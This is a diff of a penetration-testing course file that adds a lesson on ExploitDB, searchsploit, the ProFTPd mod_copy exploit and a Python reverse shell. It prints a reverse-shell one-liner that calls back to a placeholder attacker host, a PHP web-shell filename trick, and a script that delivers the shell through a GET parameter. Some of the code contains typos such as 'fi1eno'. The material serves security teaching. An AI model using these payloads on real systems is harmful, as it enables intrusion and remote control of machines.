@@ -14,15 +14,14 @@ ___
 
 ## Lesson - Module 2 — Lesson 1 1: Python Modules
 
-### Lesson Overview
+### Lesson 11 Overview
 
-### In this lesson we will discuss
-
-* Exception Handling
-* Standard Libraries Tour
-  * urllib / requests
-  * re / BeautifulSoup
-  * base64
+* In this lesson we will discuss
+  * Exception Handling
+  * Standard Libraries Tour
+    * urllib / requests
+    * re / BeautifulSoup
+    * base64
 
 ### Error Handling
 
@@ -364,10 +363,281 @@ simple functions: b64encode() and b64decode()
   
   * You will have plenty of opportunity to work with base64 in the exercise.
 
+### Lesson 11 Summary
+
+* In this lesson we will discuss
+  * Exception Handling
+  * Standard Libraries Tour
+    * urllib / requests
+    * re / BeautifulSoup
+    * base64
+
 ___
 
-### Exercise - Module 2, Lesson 11 – Python Modules
+## Lesson - Module 2 — Lesson 12: Python and ExploitDB
+
+___
+
+### Lesson 12 Overview
+
+* In this lesson we will discuss:
+  * ExploitDB introduction
+  * searchsploit
+  * Python reverse shell
+  * Exploitation, callback & privilege escalation exercise
+
+### ExploitDB introduction
+
+* Returning to the Metasploit Framework
+  * `msfconsole` provides a rudimentary way to search for exploits.
+  * This is command-line based, and limited to only Metasploit modules.  
+![ExploitDB](./Files/Images/Lesson12/exploitdb1.png)
+* What if you could search for any general exploit code?
+  * There are a handful of POC (Proof-of-Concept) exploit scripts available
+  * But not all of them are strictly Metasploit modules.
+  * As CTE, we need to be able to find previous exploits or vulnerabilities.
+  * Wouldn't it be handy to have a database of well-documented exploits?
+* Introduction to ExploitDB
+  * `https://exploit-db.com` maintains up-to-date and current records of known vulnerabilities and attack scripts.
+  * The project is owned and maintained by Offensive Security.
+  * Their website allows you to search by
+    * Type (Denial of Service, remote or local exploit, etc.)
+    * Platform (Windows, Linux, Mobile, etc.)
+    * Service Port
+    * "Tag" (code injection, buffer overflow, cross-site scripting, etc.)  
+
+![ExploitDB](./Files/Images/Lesson12/exploitdb2.png)  
+
+* This is why enumeration is so important.
+  * The software name and version number acquired during enumeration will help with finding an old vulnerability or exploit.
+  * You won't be crafting any zero-days.
+  * But old, unpatched or misconfigured software is certainly prevalent today.
+* Search whatever information you have on a target.
+  * The version number helps narrow down results and potential exploits.  
+![ExploitDB](./Files/Images/Lesson12/exploitdb3.png)
+* Some entries might just be explanations  
+![ExploitDB](./Files/Images/Lesson12/exploitdb4.png)
+* ...but most include exploit code!
+  * You won't *always* see Python used for exploit scripts.
+  * But, because it is so ubiquitous and so powerful, it is common.
+  * This script uses Python 2.
+  * Your mileage may vary with these exploit scripts..
+  * **They may not always work!**
+![ExploitDB](./Files/Images/Lesson12/exploitdb5.png)
+* You may find Metasploit modules as well:
+  * As you know, Metasploit is written in **Ruby**.
+  * You can read the code to better understand how the module works.
+  * These are often more reliable than other scripts.
+  * **but sometimes you are not allowed to use Metasploit!**
+![ExploitDB](./Files/Images/Lesson12/exploitdb6.png)
+* Multiple results and findings are not a bad thing!
+  * We've seen **three** different results for one service and potential exploit.
+  * This helps us determine possible avenues for attacking a vulnerability.
+  * You can use all of the different resources to determine what works best
+* ExploitDB Resources
+  * The exploit database maintains code to take advantage of vulnerabilities so you don't have to.
+  * To stay on top of the latest exploits that are released daily, keep tabs on their Twitter account.  
+`https://twitter.com/ExploitDB`
+  * Additional resources can be found within the original ExploitDB and Offensive Security websites.  
+`https://www.exploit-db.com/`
+`https://www.offensive-security.com/`
+
+### searchsploit
+
+* What if your assessment has no Internet access?
+  * ExploitDB also offers a command-line utility to search their database.
+  * You can take a copy of ExploitDB with you wherever you go!
+  * The tool lets you perform offline searches on a local copy of the repository.
+  * If you are running the standard Kali Linux build, it is available by default!
+* Introducing *searchsploit*  
+![SearchSploit](./Files/Images/Lesson12/searchsploit1.png)
+* *searchsploit* is very intuitive:
+  * You can use any number of search terms.
+  * By default, search terms are ***not case-sensitive*** & order does not matter.
+  * Remember the biggest advantage is that you can use this utility from the command-line and offline without internet.
+* The tool offers a local path for exploits:
+  * Searching for the same banner information yields the same results, **as expected!**  
+  ![SearchSploit](./Files/Images/Lesson12/searchsploit2A.png)
+* Let's "mirror" an exploit...
+  * "Mirroring" copies of file to our current working directory.
+  * The we can more easily work worh it or modify it  
+![SearchSploit](./Files/Images/Lesson12/searchsploit2.png)
+* Understanding this Exploit
+  * In the example, we copied the Python 2 script.
+  * Notice:  
+    * No shebang line!
+    * Defining variables based off command-line arguments.
+    * Using PHP syntax to create a primitive web shell.  
+
+  ![SearchSploit](./Files/Images/Lesson12/searchsploit3.png)
+  * The use of site cpfr and site cpto allow copying files.
+  * The script copies a web shell into an accessible directory!
+  * Unfortunately:
+    * Numerous spelling errors.
+    * No exception handling.
+    * No command results shown.
+      * **This is bad code!*
+
+  ![SearchSploit](./Files/Images/Lesson12/searchsploit4.png)
+* Remember: this is another person's code!
+  * The script might not even work!  
+![SearchSploit](./Files/Images/Lesson12/searchsploit5.png)
+  * It hangs for a long period of time...
+* This is why we need to be able to understand the exploit.
+  * ... And eventually fails  
+  ![SearchSploit](./Files/Images/Lesson12/searchsploit6.png)
+* The gist of the exploit:
+  * The **mod_copy** plugin for this version of ProFTPd allows commands **site cpfr** and **site cpto**, which can be used to copy files.
+  * It is possible to copy data *from our input* (`/proc/se1f/fd/3` as attempted) to a file that can be accessed on the website.
+  * Because there is a web server with PHP running, and we can supply arbitrary PHP, we can achieve **Remote Code Execution!**
+* So why didn't that exploit script work?
+  * We can connect to the service manually and try to run those commands.  
+![SearchSploit](./Files/Images/Lesson12/searchsploit7.png)
+  * During testing, we receive a **Permission denied** error!
+  * Could this exploit be done in any other way?
+* Analyze the Metasploit module  
+![SearchSploit](./Files/Images/Lesson12/searchsploit8.png)
+* Important Variables  
+![SearchSploit](./Files/Images/Lesson12/searchsploit9.png)
+  * Because this operates as a module, it works with (and provides a short description for) some special variables.
+  * Remember: this is the **Ruby** programming language.  
+
+![SearchSploit](./Files/Images/Lesson12/searchsploit10.png)
+![SearchSploit](./Files/Images/Lesson12/searchsploit11A.png)
+![SearchSploit](./Files/Images/Lesson12/searchsploit11.png)
+![SearchSploit](./Files/Images/Lesson12/searchsploit12.png)
+![SearchSploit](./Files/Images/Lesson12/searchsploit13.png)
+![SearchSploit](./Files/Images/Lesson12/searchsploit14.png)
+![SearchSploit](./Files/Images/Lesson12/searchsploit15.png)
+![SearchSploit](./Files/Images/Lesson12/searchsploit16.png)
+![SearchSploit](./Files/Images/Lesson12/searchsploit17.png)  
+
+* This code puts PHP code followitn the */tmp* directory on the command-line  
+
+![SearchSploit](./Files/Images/Lesson12/searchsploit18.png)
+![SearchSploit](./Files/Images/Lesson12/searchsploit19.png)
+![SearchSploit](./Files/Images/Lesson12/searchsploit20.png)
+
+* Finally executing commands:  
+![SearchSploit](./Files/Images/Lesson12/searchsploit21.png)
+  * The command is included as an HTTP GET variable & executed with PHP!
+* The difference between the Ruby script and the Python 2 script for exploiting ProFTPd:
+  * Copies *from* `/proc/self/cmdline...`
+    * This includes **the filenames** used in the mod_copy operation.
+  * ... To a fake file, `/tmp/<?php passthrou($_GET["cmd"]) ?>`
+    * Notice this is in **/tmp**, a *world-writable* directory!
+    * No more Permission Denied error.
+  * The PHP code present in the filename is now *in* the file!
+  * We can now copy that file to the folder accessible to the website.
+* Let's see that manually as well:  
+  * Trying these commands yields much better results.  
+ ![SearchSploit](./Files/Images/Lesson12/searchsploit22.png)
+  * Now we can view anything .php on the website and see the whoami output
+* We can verify the results:
+  * As before, we can access the site with Python and the requests module.  
+  ![SearchSploit](./Files/Images/Lesson12/searchsploit23.png)
+  * See how the full command is visible?
+  * The result of whoami just follows after "=/tmp", like the PHP code did
+    * The output of the whoami command is www-data!
+* Now we understand how the exploit works.
+  * We've seen a Python script do it wrong, and a Metasploit module do it right
+  * Why not write a Python 3 script, that incorporates all the best parts?
+  * Correct inputs, communicative output, exception handling...
+  * The command & control should be as flexible and easy as possible.  
+
+### Python reverse shell
+
+* Leverage an exploit to get a reverse shell!
+  * The best form of control is a reverse shell:
+  * Since you have a form of Remote Code Execution (RCE), you can have the victim machine connect back to you.
+  * With a reverse shell, you interact with a command-line actively on the box.
+  * This can be accomplished with many different languages.  
+  * [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+* In Python, this is accomplished with two modules
+  * You have connected with a remote host with the socket module before...
+  * And you have heard of the os module!
+  * For a Python reverse shell:
+  ![ReverseShell](./Files/Images/Lesson12/reverseshell1.png)
+* Basic source code for a Python reverse shell:  
+![ReverseShell](./Files/Images/Lesson12/reverseshell2.png)
+  * Remember, you connect back to your **attacker machine**.
+  * Duplicating the file descriptors, 0, 1, and & 2 make the connection interactive.
+* Often times this is minified.
+  * On cheatsheets you will see this compressed to just one long line.  
+
+    ```python
+    python -c 'import os, socket; s=socket.socket(); s.connect(("YOUR.HOST.IP.ADDRESS",9001)); os.dup2(s.fi1eno(), 0); os.dup2(s.fi1eno(), 1); os.dup2(s.fi1eno(),2); os.system( "/bin/sh")'
+    ```
+
+  * This is so you can easily copy and paste it in your RCE vector!
+  * Remember, you'll need to set up a *listener* to catch the reverse shell.  
+  ![ReverseShell](./Files/Images/Lesson12/reverseshell3.png)
+* Execute this with the RCE attack vector:
+  * This payload has a lot of special characters...
+  * It is best to send it thorugh the HTTP GET variable passed to PHP
+
+    ```python
+    #!/usr/bin/env python3
+
+    import socket, requests
+
+    # Create a socket object and connect to FTP service
+    # With the socket object, send CPFR and CPTO commands to create a PHP webshell.  
+    # # Have the webshell read from a GET variable, and send along your reverse shell!
+
+    requests .get("http://192.168.229.le5/rce.php?c=python -c 'import os, socket; s=socket.socket(); s.connect(("YOUR.ATTACKR.IP.ADDRESS",9001)); os.dup2(s.fi1eno(), 0); os.dup2(s.fi1eno(), 1); os.dup2(s.fi1eno(),2); os.system(\"/bin/sh\")'")
+    ```  
+
+* You will see the server connect back!
+  * If you use the -v verbose flag on your listener, you will see the connection.  
+![ReverseShell](./Files/Images/Lesson12/reverseshell4.png)
+  * There won't be a "visible" prompt, but you do have a shell!
+* Now, commands can be entered in an interactive way  
+![ReverseShell](./Files/Images/Lesson12/reverseshell5.png)
+* Some drawbacks:
+  * Our reverse shell was set to run `/bin/sh` ...why not use `/bin/bash`?
+  * This shell is not very "stable:"
+    * Control characters (like ^C to stop a program) could kill the connection.
+    * Moving the cursor with left-and-right arrows produces escape
+sequences.
+    * No Tab auto-completion functionality.
+    * No visible prompt
+* A quick magic trick helps fix these issues:
+![ReverseShell](./Files/Images/Lesson12/reverseshell6.png)
+* Command and control on the victim machine!
+  * You have flexible remote code execution.
+  * **Now what?**
+![ReverseShell](./Files/Images/Lesson12/reverseshell7.png)
+
+### Exploitation, callback & privilege escalation exercise
+
+* Privilege Escalation can be done in many, many ways.
+  * Outlets for privilege escalation will be visited in future iterations of this course.
+  * You could use another exploit, take advantage of different services, abuse some misconfiguration . the list goes on.
+  * If you are interested, explore these resources to get a better idea of what to do next once you have a shell on a remote machine.  
+    * `https://github.com/rebootuser/LinEnum`  
+    * `https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/`
+
+### Lesson 12 Summary
+
+* In this lesson we have discussed:
+  * ExploitDB introduction
+  * searchsploit
+  * Python reverse shell
+  * Exploitation, callback & privilege escalation exercise
+
+___
+
+___
+
+## Exercise - Module 2, Lesson 11 – Python Modules
 
 ___
 
 [Module 2, Lesson 11 Script File](./Scripts/Python/Mod2L11-Python-Modules.py)  
+
+___
+
+## Exercise - Module 2, Lesson 12 – Python and ExploitDB
+
+___
